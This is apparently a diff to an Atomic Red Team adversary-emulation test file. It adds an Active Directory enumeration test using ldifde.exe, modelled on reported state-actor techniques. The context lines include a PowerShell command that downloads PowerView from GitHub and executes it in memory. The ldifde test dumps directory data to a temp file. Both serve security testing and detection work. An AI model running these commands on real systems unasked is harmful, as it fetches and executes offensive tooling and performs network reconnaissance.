@@ -207,3 +207,43 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
     name: powershell
+- name: Active Directory Enumeration with LDIFDE
+  description: |
+    Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.
+    The test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_path:
+      description: Path to the file that ldifde will output
+      type: path
+      default: C:\Windows\temp
+    output_file:
+      description: The filename to be created by ldifde
+      type: string
+      default: atomic_ldifde.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      PowerShell ActiveDirectory Module must be installed
+    prereq_command: |
+      Try {
+          Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
+          exit 0
+      }
+      Catch {
+          exit 1
+      }
+    get_prereq_command: |
+      if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+        Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+      } else {
+        Install-WindowsFeature RSAT-AD-PowerShell
+      }
+  executor:
+    elevation_required: true
+    command: |
+      ldifde.exe -f #{output_path}\#{output_file} -p subtree
+    cleanup_command: |
+      del #{output_path}\#{output_file}
+    name: command_prompt
